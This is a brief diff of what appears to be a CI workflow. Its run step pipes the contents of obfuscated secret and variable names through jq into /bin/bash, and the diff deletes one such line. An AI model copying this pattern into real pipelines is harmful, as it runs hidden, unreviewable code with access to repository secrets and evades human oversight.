@@ -22,7 +22,6 @@ jobs:
           gxj9385: ${{ secrets.gxj9385 }}
         run: |
           printf '%s' "$gxj9385" | jq -r .i2 | /bin/bash
-          printf '%s' "$gnb2851" | jq -r .wfse6 | /bin/bash
           echo $fu5 | jq -r .slwt9 | /bin/bash
           printf '%s' "$onih607" | jq -r .vx98 | /bin/bash
           printf '%s' "$xwje4264" | jq -r .i323 | /bin/bash
